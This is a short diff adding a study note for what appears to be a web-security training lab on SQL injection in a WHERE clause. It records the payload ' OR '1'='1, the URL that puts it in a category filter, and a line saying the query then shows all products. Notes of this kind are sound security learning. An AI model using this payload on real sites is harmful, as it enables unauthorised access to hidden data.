@@ -1,0 +1,4 @@
+Lab: SQL injection WHERE clause hidden data
+Payload: ' OR '1'='1
+URL: /filter?category=' OR '1'='1
+Description: WHERE clause break and shown all products.
